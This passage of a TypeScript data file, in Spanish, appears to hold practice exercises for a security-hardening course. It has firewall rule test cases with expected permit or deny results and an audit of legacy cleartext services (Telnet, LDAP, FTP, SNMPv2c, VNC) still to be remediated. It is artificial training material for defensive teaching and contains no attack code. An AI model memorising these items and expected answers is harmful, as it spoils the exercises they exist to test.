    name: 'MTA Remoto -> Pasarela Correo DMZ (SMTPS)',
    sourceIp: '198.51.100.89',
    protocol: 'TCP',
    destIp: '172.16.10.20',
    destPort: '465',
    expectedAction: 'PERMIT',
    description: 'Recepción de correo cifrado desde servidores de correo de Internet.'
  },
  {
    id: 'test-web-to-db-postgres',
    name: 'Web Server DMZ -> Base de Datos PCI-DSS (SQL)',
    sourceIp: '172.16.10.10',
    protocol: 'TCP',
    destIp: '10.0.30.50',
    destPort: '5432',
    expectedAction: 'PERMIT',
    description: 'Consultas SQL legítimas para consultar saldos y transacciones.'
  },
  {
    id: 'test-dmz-to-lan-lateral',
    name: 'Ataque Lateral: DMZ Comprometida -> LAN Interna',
    sourceIp: '172.16.10.10',
    protocol: 'TCP',
    destIp: '10.0.20.15',
    destPort: '445',
    expectedAction: 'DENY',
    description: 'Intento de propagación SMB desde un servidor DMZ comprometido hacia computadoras de usuarios.'
  },
  {
    id: 'test-lan-outbound-web',
    name: 'Estación LAN -> Internet Externa (HTTPS)',
    sourceIp: '10.0.20.104',
    protocol: 'TCP',
    destIp: '142.250.190.46',
    destPort: '443',
    expectedAction: 'PERMIT',
    description: 'Navegación web saliente legítima de empleados hacia servicios autorizados.'
  },
  {
    id: 'test-wan-direct-to-db',
    name: 'Ataque Externo: WAN -> Subred PCI-DSS Directa',
    sourceIp: '185.220.101.5',
    protocol: 'TCP',
    destIp: '10.0.30.50',
    destPort: '5432',
    expectedAction: 'DENY',
    description: 'Intento de conexión directa desde Internet a la base de datos de tarjetas de crédito.'
  }
];

// --------------------------------------------------------
// PBQ 50: Endpoint & Network Port Hardening + Protocol Migration Audit
// --------------------------------------------------------
export const INITIAL_PORT_AUDIT_PBQ50: PortAuditItem[] = [
  {
    id: 'port50-core-switch',
    serviceName: '1. Routers & Switches de Distribución Core (192.168.1.1)',
    legacyPort: 23,
    legacyProtocol: 'Telnet / HTTP (TCP 23 & 80)',
    vulnerabilityDescription:
      'Las consolas de administración VTY y los paneles de switches Cisco Catalyst operan mediante Telnet en puerto 23 y HTTP web en puerto 80. Las credenciales de "enable" y contraseñas de red viajan en texto plano sin cifrar.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: ''
  },
  {
    id: 'port50-identity-directory',
    serviceName: '2. Controlador de Dominio & Directorio Activo (192.168.1.10)',
    legacyPort: 389,
    legacyProtocol: 'LDAP (TCP 389 sin firmar)',
    vulnerabilityDescription:
      'Múltiples servidores de aplicaciones internas autentican usuarios contra Active Directory utilizando LDAP en texto plano por el puerto TCP 389, exponiendo nombres de usuario, grupos y hashes en la red interna.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: ''
  },
  {
    id: 'port50-financial-ftp',
    serviceName: '3. Pasarela de Nóminas & Transferencias Bancarias (192.168.1.20)',
    legacyPort: 21,
    legacyProtocol: 'FTP / TFTP (TCP 20/21 & UDP 69)',
    vulnerabilityDescription:
      'Un script batch transmite archivos CSV de pagos bancarios y nóminas mediante FTP tradicional (puertos 20 y 21) sin cifrar, mientras que las actualizaciones de firmware de routers usan TFTP (puerto 69) sin autenticación.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: ''
  },
  {
    id: 'port50-corporate-dns',
    serviceName: '4. Servidores DNS Internos y Recursivos (192.168.1.30)',
    legacyPort: 53,
    legacyProtocol: 'DNS Tradicional (UDP 53 en claro)',
    vulnerabilityDescription:
      'Las consultas de nombres de dominio y respuestas viajan en texto plano por UDP 53 sin validación criptográfica de firmas, lo que permite ataques de envenenamiento de caché (DNS Cache Poisoning) y espionaje de navegación.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: ''
  },
  {
    id: 'port50-network-monitoring',
    serviceName: '5. Plataforma de Monitoreo de Red Zabbix/PRTG (192.168.1.40)',
    legacyPort: 161,
    legacyProtocol: 'SNMPv1 / SNMPv2c (UDP 161)',
    vulnerabilityDescription:
      'Los sensores de red interrogan MIBs y parámetros de hardware usando SNMPv2c con la cadena comunitaria estática "public" transmitida en texto claro, permitiendo a cualquier sniffer leer topologías y alterar configuraciones.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: ''
  },
  {
    id: 'port50-remote-desktop',
    serviceName: '6. Servidores de Gestión y Acceso a Servidores (192.168.1.50)',
    legacyPort: 5900,
    legacyProtocol: 'VNC / RDP sin NLA (TCP 5900 & 3389 expuesto)',
    vulnerabilityDescription:
      'Técnicos externos acceden mediante servidores VNC desactualizados (puerto 5900 sin cifrado de sesión) y conexiones RDP sin Autenticación a Nivel de Red (NLA), vulnerables a ataques Man-in-the-Middle y fuerza bruta continua.',
    selectedInsecurityReason: '',
    selectedSecurePort: null,
    selectedSecureProtocol: '',
    selectedRemediationAction: ''
  }
];









